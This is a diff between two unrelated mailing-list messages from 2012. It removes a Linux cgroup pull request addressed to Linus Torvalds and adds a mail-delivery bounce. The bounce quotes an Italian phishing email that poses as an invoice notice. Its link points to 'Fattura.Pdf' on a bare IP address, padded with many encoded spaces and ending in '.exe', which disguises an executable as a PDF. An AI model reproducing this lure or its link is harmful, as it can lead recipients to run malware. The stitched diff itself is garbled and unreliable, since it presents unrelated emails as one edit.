@@ -1,12 +1,11 @@
-From: Tejun Heo <tj-DgEjT+Ai2ygdnm+yROfE0A@public.gmane.org>
-Subject: [GIT PULL] cgroup fixes for v3.7-rc2
-Date: Wed, 24 Oct 2012 12:54:41 -0700
-Message-ID: <20121024195441.GI12182@atj.dyndns.org>
+From: Mail Delivery System <Mailer-Daemon-QkXf3z1YI6JrHZRz6P5rDdHuzzzSOjJt@public.gmane.org>
+Subject: Mail delivery failed: returning message to sender
+Date: Wed, 24 Oct 2012 16:03:59 +0200
+Message-ID: <E1TR1Yt-00014h-Ex@ns81.hostinglmi.net>
 Mime-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-Content-Disposition: inline
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
 List-Archive: <http://lists.linuxfoundation.org/pipermail/containers/>
@@ -16,40 +15,46 @@ List-Subscribe: <https://lists.linuxfoundation.org/mailman/listinfo/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=subscribe>
 Sender: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-To: Linus Torvalds <torvalds-de/tnXTf+JLsfHDXvbKv3WD2FQJk+8+b@public.gmane.org>
-Cc: cgroups-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org, linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
+To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-Hello, Linus.
+This message was created automatically by mail delivery software.
 
-This pull request contains three fixes.  Two are reverts of
-task_lock() removal in cgroup fork path.  The optimizations
-incorrectly assumed that threadgroup_lock can protect process forks
-(as opposed to thread creations) too.  Further cleanup of cgroup fork
-path is scheduled.  The third fixes cgroup emptiness notification
-loss.
+A message that you sent could not be delivered to one or more of its
+recipients. This is a permanent error. The following address(es) failed:
 
-Please pull from the following git branch to receive the above
-changes.
+  brina.persiani-3+OAmDpNHv6onA0d6jMUrA@public.gmane.org
+    Domain bh-fonfria.com has exceeded the max emails per hour (3/2 (150%)) allowed.  Message discarded.
 
-  git://git.kernel.org/pub/scm/linux/kernel/git/tj/cgroup.git for-3.7-fixes
+------ This is a copy of the message, including all the headers. ------
 
-for you to fetch changes up to d87838321124061f6c935069d97f37010fa417e6:
+Return-path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+Received: from [180.150.153.17] (port=59826 helo=441274-db1.indyarocks.com)
+	by ns81.hostinglmi.net with esmtpa (Exim 4.80)
+	(envelope-from <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>)
+	id 1TR1Ys-000145-Lu
+	for brina.persiani-3+OAmDpNHv6onA0d6jMUrA@public.gmane.org; Wed, 24 Oct 2012 16:03:59 +0200
+Received: from root by 441274-db1.indyarocks.com with local-bsmtp (Exim 4.71 (FreeBSD))
+	(envelope-from <forum-Q0ErXNX1RuYU9PqXxfY7+A@public.gmane.org>)
+	id sqoFOV-000DmZ-vz; Wed, 24 Oct 2012 19:33:50 +0530
+Date: Wed, 24 Oct 2012 19:33:50 +0530
+From: "Pay" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+To: <brina.persiani-3+OAmDpNHv6onA0d6jMUrA@public.gmane.org>
+Subject: Re: document 11293
+Message-ID: <Rgrf6735527-9/shz0SragYGAi9D+dwHKF7F/SLMIK8YAL8bYrjMMd8@public.gmane.org>
+MIME-Version: 1.0
+Content-Type: text/plain;
+ charset="UTF-8"
+Content-Transfer-Encoding: 8bit
 
-  Revert "cgroup: Remove task_lock() from cgroup_post_fork()" (2012-10-19 14:09:35 -0700)
 
-----------------------------------------------------------------
-Daisuke Nishimura (1):
-      cgroup: notify_on_release may not be triggered in some cases
+          
+Gentile utente, Monte Biz 
 
-Tejun Heo (2):
-      Revert "cgroup: Drop task_lock(parent) on cgroup_fork()"
-      Revert "cgroup: Remove task_lock() from cgroup_post_fork()"
+id14464406
+La tua richiesta e stata completata.
+Scusa per il report in ritardo.
+      
 
- kernel/cgroup.c | 41 ++++++++++-------------------------------
- 1 file changed, 10 insertions(+), 31 deletions(-)
-
-Thanks.
-
---
-tejun
+Dettagli possono essere trovati in un documento qui
+http://69.175.59.10/Fattura.Pdf%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.exe
